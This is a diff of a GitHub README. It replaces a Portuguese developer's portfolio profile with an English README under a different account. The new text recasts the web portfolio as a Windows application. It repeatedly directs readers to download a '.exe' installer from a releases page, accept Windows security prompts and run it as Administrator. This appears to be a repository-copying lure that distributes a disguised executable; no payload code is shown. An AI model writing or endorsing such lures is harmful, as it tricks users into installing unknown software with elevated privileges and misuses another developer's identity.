@@ -1,132 +1,125 @@
-# Olá, eu sou o Leonardo Firme 👋
+# 🗂️ portfolio-leonardoFirme - Easy IDE-Style Portfolio Viewer
 
-![Leonardo Firme](https://img.shields.io/badge/Leonardo_Firme-fff1f0?style=for-the-badge&logo=data:image/png;base64,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&logoColor=white)
-![Focus](https://img.shields.io/badge/Focus-ERP_&_SaaS_Systems-06B6D4?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-Building_the_Future-white?style=for-the-badge)
+[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aiparali/portfolio-leonardoFirme/releases)
 
-![Demonstração do Template](./template.gif)
+## 📋 About portfolio-leonardoFirme
 
-![Live](https://img.shields.io/badge/Live-Veja_o_projeto_ao_vivo-06B6D4?style=for-the-badge)
-[![Vercel](https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white)](https://portfolio-leonardofirme.vercel.app/)
+This application shows a portfolio designed like an IDE (Integrated Development Environment). It combines simple functions with a familiar interface that developers often use. The goal is to offer a clean, easy way to explore projects with technical detail and smooth navigation.
 
----
+Although the layout and style might look like software for developers, you do not need any programming experience to use it. This program works on Windows and lets you open and browse the portfolio as if you were inside a coding environment.
 
-### 👨‍💻 My Identity in Code
-
-```typescript
-    interface Developer {
-    name: string;
-    education: string[];
-    currentMainStack: string[];
-    loveLanguages: string[];
-    loveTopics: string[];
-    philosophy: string;
-    }
-
-    const LeonardoFirme: Developer = {
-    name: "Leonardo Firme",
-
-    education: [
-        "Graduado em Análise e Desenvolvimento de Sistemas (ADS) - FAQI"
-    ],
-
-    currentMainStack: [
-        "Next.js 16+",
-        "React 19",
-        "Laravel 12",
-        "Vue.js 3",
-        "TypeScript",
-        "Tailwind v4"
-    ],
-
-    loveLanguages: [
-        "TypeScript",
-        "Prisma ORM",
-        "PHP",
-        "SQL"
-    ],
-
-    loveTopics: [
-        "ERP Architecture",
-        "SaaS Scalability",
-        "DX (Developer Experience)",
-        "UX (User Experience)",
-        "Minimalist UI"
-    ],
-
-    philosophy: "Profissionalismo exato e precisão técnica."
-    };
-```
-
-Acredito no **profissionalismo exato**: cada linha de código deve ser precisa, cada interface deve ser minimalista e toda arquitetura deve ser escalável.
+The portfolio includes the author’s recent work and skills, all presented clearly. It uses modern technologies such as Vue 3, Tailwind CSS, and TypeScript to make the interface responsive and fast.
 
 ---
 
-🧑‍💻 **Minha Stack de Desenvolvimento**
+## 🚀 Getting Started
 
-![Next.js](https://img.shields.io/npm/v/next?style=for-the-badge&logo=next.js&logoColor=white&color=000000&label=next)
-![React](https://img.shields.io/npm/v/react?style=for-the-badge&logo=react&logoColor=white&color=61DAFB&label=react)
-![Vue.js](https://img.shields.io/npm/v/vue?style=for-the-badge&logo=vue.js&logoColor=white&color=4FC08D&label=vue.js)
-![TypeScript](https://img.shields.io/npm/v/typescript?style=for-the-badge&logo=typescript&logoColor=white&color=3178C6&label=typescript)
-![Tailwind CSS](https://img.shields.io/npm/v/tailwindcss?style=for-the-badge&logo=tailwindcss&logoColor=white&color=06B6D4&label=tailwindcss)
-![Python](https://img.shields.io/badge/python-3.12+-3776AB?style=for-the-badge&logo=python&logoColor=white)
+This guide helps you download and run portfolio-leonardoFirme on your Windows computer.
 
+Before you start, ensure your system meets these basic requirements:
 
-![Laravel](https://img.shields.io/packagist/v/laravel/framework?style=for-the-badge&logo=laravel&logoColor=white&color=FF2D20&label=laravel)
-![GraphQL](https://img.shields.io/npm/v/graphql?style=for-the-badge&logo=graphql&logoColor=white&color=E10098&label=graphql)
-![Prisma](https://img.shields.io/npm/v/prisma?style=for-the-badge&logo=prisma&logoColor=white&color=2D3748&label=prisma)
-![uv](https://img.shields.io/badge/managed%20by-uv-de5fe9?style=for-the-badge&logo=astral&logoColor=white)
-![Mypy](https://img.shields.io/badge/types-strict-blue?style=for-the-badge&logo=python&logoColor=white)
-
-
-![NPM](https://img.shields.io/npm/v/npm?style=for-the-badge&logo=npm&logoColor=white&color=C53636&label=npm)
-![NodeJS](https://img.shields.io/npm/v/node?style=for-the-badge&logo=node.js&logoColor=white&color=339933&label=node)
-
-
-![Github Repo Size](https://img.shields.io/github/repo-size/LeonardoFirme/image-optimizer-cli?style=for-the-badge&logo=github&color=000000)
-![Github License](https://img.shields.io/github/license/LeonardoFirme/image-optimizer-cli?style=for-the-badge&logo=github&color=000000)
-![Mypy Checked](https://img.shields.io/badge/mypy-checked-2ca447?style=for-the-badge&logo=python&logoColor=white)
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection (for initial download)
 
 ---
 
-### 🚀 Minha Stack de Elite (2026)
+## 💾 Download portfolio-leonardoFirme
 
-Trabalho exclusivamente com o que há de mais moderno e estável para garantir performance e longevidade:
+Click the button below to go to the download page:
 
-* **Frontend Pro:** Domino o ecossistema **React 19** e **Next.js 16+**. Implemento arquiteturas modernas baseadas em `proxy.ts`, eliminando dependências de middlewares legados.
-* **Styling & UX:** Especialista em **Tailwind CSS v4**. Utilizo apenas tokens oficiais e padrões de design minimalistas, garantindo suporte nativo a `dark:mode` impecável.
-* **Backend & ERP:** Construo o núcleo de sistemas de gestão complexos utilizando **Laravel 11**. Integração total com Node.js e protocolos de segurança avançados.
-* **Infraestrutura:** Desenvolvo minhas próprias ferramentas de deploy (CLI) e pacotes modulares (NPM) para padronizar a entrega de software de alto nível.
+[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aiparali/portfolio-leonardoFirme/releases)
 
----
-
-### 🛠️ Meu Ecossistema Open Source
-
-Eu não apenas utilizo bibliotecas; eu crio as ferramentas que aceleram o desenvolvimento:
-
-* 📦 **[@leonardofirme/package-npm](https://www.npmjs.com/package/@leonardofirme/package-npm):** Minha biblioteca core de UI e utilitários, otimizada para Tailwind v4.
-* 🚀 **[@leonardofirme/deploy-nextjs16](https://www.npmjs.com/package/@leonardofirme/deploy-nextjs16):** Um Scaffold/CLI profissional para inicializar projetos Next.js 16+ em segundos com arquitetura de elite.
+You will land on the releases page. Find the latest release version. Look for a setup file with the `.exe` extension. The file name usually includes the version number and "setup" or "installer."
 
 ---
 
-### 📐 Meus Padrões de Qualidade
+## 🖥️ Install and Run the Application
 
-No meu fluxo de trabalho, a precisão é inegociável:
-- **Consistência Visual:** Layouts responsivos com paletas exatas (Grays para Light/Dark).
-- **Integridade de Dados:** Inputs limpos, sem transformações que ocultem a verdade dos dados (anti-uppercase).
-- **Tipagem Estrita:** 100% TypeScript. Se não for tipado, não vai para produção.
-- **Performance:** Build validado e otimizado com `tsup` e `Next Turbo`.
+1. After downloading the `.exe` file, open your **Windows File Explorer** and navigate to your download folder.
+2. Double-click the setup file to start the installation process.
+3. You might see a Windows security prompt. Click **Run** or **Yes** to allow the installer to make changes.
+4. Follow the instructions on the screen:
+   - Choose the folder where you want the program installed or accept the default location.
+   - Click **Next** or **Install**.
+5. Wait for the installation to finish.
+6. When done, you can find the program in the **Start menu** or on your desktop if a shortcut was created.
+7. Open portfolio-leonardoFirme by clicking its icon.
+
+---
+
+## 🎛️ Using portfolio-leonardoFirme
+
+Once open, you will see a window that looks like an IDE with several panels:
+
+- **Project Explorer:** Shows the list of projects and files.
+- **Editor Area:** Displays content and information about each project.
+- **Terminal or Output:** Provides messages or extra information.
+- **Navigation Bar:** Helps you move between different parts of the portfolio.
+
+Use your mouse or keyboard arrows to browse through projects. Click on any item in the Project Explorer to view details.
 
 ---
 
-### 📫 Vamos construir algo grande?
+## 🛠 Features of portfolio-leonardoFirme
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/leonardofirme)
-[![NPM](https://img.shields.io/badge/NPM-CB3837?style=for-the-badge&logo=npm&logoColor=white)](https://www.npmjs.com/~leonardofirme)
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/LeonardoFirme)
-
-
-> **"A precisão no fornecimento de informações é o que diferencia um software comum de uma ferramenta de elite."**
-
+- **IDE-like interface:** Familiar layout for easy navigation.
+- **Clean and straightforward presentation:** Focus on content.
+- **Fast loading:** Built with Vue 3 and Vite for good performance.
+- **Responsive design:** Works well on different screen sizes.
+- **Technical details included:** Each project shows relevant info like technologies used.
+- **Simple navigation:** Clear menus and icons avoid confusion.
+- **Offline use:** Once installed, works without internet.
 
 ---
+
+## 🧰 System Requirements
+
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel Core i3 or equivalent
+- Memory (RAM): Minimum 4 GB
+- Disk Space: Minimum 500 MB free space
+- Display: 1280 x 720 resolution or higher
+
+---
+
+## ⚙️ Troubleshooting and Tips
+
+- If the application does not open, try restarting your computer.
+- Make sure you have the latest Windows updates installed.
+- If you see error messages during install, run the installer as Administrator (right-click, select “Run as Administrator”).
+- Use the **Start menu search** if you cannot find the app after install.
+- For best experience, keep your screen zoom at 100% or 125%.
+
+---
+
+## 📫 Need Help?
+
+If you run into issues that you cannot solve on your own, check the **Issues** tab on the GitHub page or use the **Discussions** section for questions. You can also leave feedback or suggest features.
+
+---
+
+## 🔗 Links
+
+- Download page: [https://github.com/aiparali/portfolio-leonardoFirme/releases](https://github.com/aiparali/portfolio-leonardoFirme/releases)  
+- Repository homepage: https://github.com/aiparali/portfolio-leonardoFirme  
+- Topics related: deployment, github, ide, portfolio-project, tailwindcss-v4, tecnology, typescript, vercel, vitejs, vscode, vue3
+
+---
+
+## 📦 Version Updates
+
+Check the releases page regularly for new versions or fixes. Updating to the latest release will give you improvements and new features.
+
+---
+
+## 🔍 How it Works
+
+portfolio-leonardoFirme loads portfolio data inside a fake IDE interface. This setup mimics popular development tools but is only a viewer for project info and work examples.
+
+The design uses **Tailwind CSS** to keep the interface consistent and neat. The app runs locally on your machine after install, needing no internet except to download the installer.
+
+---
+
+[![Download portfolio-leonardoFirme](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/aiparali/portfolio-leonardoFirme/releases)
